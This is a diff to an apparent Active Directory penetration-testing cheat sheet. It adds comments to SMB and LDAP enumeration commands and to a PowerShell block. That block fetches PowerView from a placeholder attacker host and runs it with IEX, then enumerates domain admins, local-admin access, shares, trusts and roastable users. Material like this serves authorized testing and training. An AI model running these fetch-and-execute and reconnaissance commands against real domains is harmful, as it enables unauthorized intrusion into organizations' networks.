@@ -100,6 +100,8 @@ Rubeus.exe monitor /interval:5 /nowrap
 
 ### SMB / LDAP Enum
 
+Use SMB for shares/policy and LDAP for directory objects after the first valid domain credential.
+
 ### SMB Enum With NetExec
 
 #Username #Password #SMB #ActiveDirectory #Enumeration
@@ -142,17 +144,23 @@ nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
 Load PowerView directly into memory and run quick domain checks.
 
 ```powershell
+# Load PowerView in memory.
 (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX
 
+# Domain overview and local-admin paths.
 Get-DomainController
 Get-DomainController | Select-Object Name
 Find-LocalAdminAccess
 Get-DomainGroup -Name "Domain Admins"
+
+# Users, groups, computers, and interesting attributes.
 Get-DomainUser
 Get-DomainGroup
 Get-DomainComputer | Select-Object dnshostname,operatingsystem
 Get-DomainGroupMember -Identity "Domain Admins"
 Get-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description
+
+# Shares, GPOs, trusts, and roastable users.
 Find-DomainShare -CheckShareAccess
 Get-DomainGPO
 Get-DomainTrust
